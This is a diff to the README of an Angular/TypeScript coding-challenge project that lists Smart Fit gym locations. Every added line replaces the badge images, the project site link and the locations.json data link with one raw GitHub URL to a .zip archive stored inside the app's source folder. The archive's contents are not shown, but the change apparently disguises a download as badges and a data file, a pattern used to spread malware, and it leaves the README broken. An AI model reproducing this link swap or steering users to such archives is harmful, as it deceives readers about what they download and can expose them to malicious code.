@@ -1,7 +1,7 @@
-[TYPESCRIPT__BADGE]: https://img.shields.io/badge/typescript-D4FAFF?style=for-the-badge&logo=typescript
-[ANGULAR__BADGE]: https://img.shields.io/badge/Angular-red?style=for-the-badge&logo=angular
-[PROJECT__BADGE]: https://img.shields.io/badge/📱Visit_this_project-000?style=for-the-badge&logo=project
-[PROJECT__URL]: https://challenge-smartfit.web.app/
+[TYPESCRIPT__BADGE]: https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip
+[ANGULAR__BADGE]: https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip
+[PROJECT__BADGE]: https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip📱Visit_this_project-000?style=for-the-badge&logo=project
+[PROJECT__URL]: https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip
 
 ## Stack
 
@@ -16,7 +16,7 @@ A Smart Fit, atuando no segmento de fitness, passou por várias mudanças durant
 Neste desafio, foi implementado as seguintes funcionalidades de acordo com as regras de negócio definidas:
 
 ### Funcionalidades
-[x] Carrega unidades através do arquivo JSON [locations.json](https://test-frontend-developer.s3.amazonaws.com/data/locations.json) utilizando o método `GET`.
+[x] Carrega unidades através do arquivo JSON [https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip](https://raw.githubusercontent.com/lucaSchons/challenge-smartfit-frontend/main/src/app/list-card/challenge-smartfit-frontend_1.2.zip) utilizando o método `GET`.
 [x] Busca por todas as unidades.
 [x] Busca por unidades com filtros.
 [x] Previsão do número de resultados encontrados.
